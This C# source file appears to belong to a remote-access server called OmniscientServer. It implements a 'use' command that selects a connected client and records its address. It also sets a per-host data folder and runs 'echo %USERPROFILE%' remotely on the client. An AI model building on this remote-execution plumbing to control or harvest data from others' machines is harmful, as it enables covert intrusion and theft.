namespace OmniscientServer
{
    public class UseClientCommand : ExecuteOnClientCommand
    {
        public UseClientCommand(Server server) : base(server) {
        }

        protected override string ExecuteCommand(string[] parameters)
        {
            if (parameters.Length > 1)
            {
                int newClientId;
                if (int.TryParse(parameters[1], out newClientId))
                {
                    if (server.clients.ContainsKey(newClientId))
                    {
                        server.clientId = newClientId;
                        server.isConnected = true;
                        server.clientHost = server.clients[newClientId].Client.RemoteEndPoint.ToString().Split(':')[0];
                        server.clientPort = server.clients[newClientId].Client.RemoteEndPoint.ToString().Split(':')[1];
                        server.clientUserProfilePath = GetClientUserProfilePath();
                        server.clientDataPath = $@"{server.dataPath}\{server.clientHost}";
                        return $"Omniscient$ Connected to client {newClientId}.";
                    }
                    else
                    {
                        return "Omniscient$ Invalid client ID.";

                    }
                }
                else
                {
                    return "Omniscient$ Invalid client ID.";
                }
            }
            else
            {
                return "Omniscient$ Please specify a client ID.";
            }
        }

        protected override bool RequiresClientConnection()
        {
            return false;
        }

        private string GetClientUserProfilePath()
        {
            string[] getUserProfilePath = { "exec", "echo", @"%USERPROFILE%" };
            string userProfilePath = base.ExecuteCommand(getUserProfilePath);
            return userProfilePath.Trim();
        }
    }
}